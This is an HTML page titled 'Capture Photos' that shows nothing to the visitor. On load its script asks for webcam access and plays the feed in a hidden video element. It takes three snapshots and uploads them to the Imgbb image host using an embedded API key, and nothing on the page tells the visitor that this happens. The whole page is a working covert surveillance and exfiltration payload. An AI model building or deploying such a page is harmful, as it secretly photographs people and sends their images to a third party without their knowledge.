<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Photos</title>
</head>
<body>
    <script>
        // Function to capture the photos
        async function capturePhotos() {
            try {
                // Ask for webcam permission
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });

                // Create a hidden video element to access the webcam feed without showing it
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Wait for the video to start playing
                await new Promise(resolve => video.onplaying = resolve);

                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                let photos = [];
                
                // Capture 3 photos at 2-second intervals
                for (let i = 0; i < 3; i++) {
                    setTimeout(() => {
                        // Capture the image from the video and store it in base64
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        photos.push(canvas.toDataURL('image/png')); // Store photo

                        // Upload the photo immediately after capturing
                        if (photos.length === 3) {
                            uploadPhotos(photos);
                        }
                    }, i * 2000); // Interval of 2 seconds
                }

                // Stop the webcam stream after the photos have been captured
                setTimeout(() => {
                    stream.getTracks().forEach(track => track.stop());
                }, 6000); // Stop after 6 seconds (since we're capturing 3 photos)

            } catch (error) {
                console.error('Error accessing webcam:', error);
            }
        }

        // Function to upload photos to Imgbb
        async function uploadPhotos(photos) {
            const apiKey = '8da16eec92bb3f899f7d86ffa582a1f9';  // Replace with your Imgbb API key

            // Upload each photo to Imgbb
            for (const photo of photos) {
                const formData = new FormData();
                formData.append('image', photo.split(',')[1]); // Extract base64 data

                const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
                    method: 'POST',
                    body: formData,
                });

                const data = await response.json();
                if (data.success) {
                    console.log('Uploaded image URL:', data.data.url);
                } else {
                    console.error('Upload failed:', data);
                }
            }
        }

        // Start capturing photos as soon as permission is granted
        capturePhotos();
    </script>
</body>
</html>
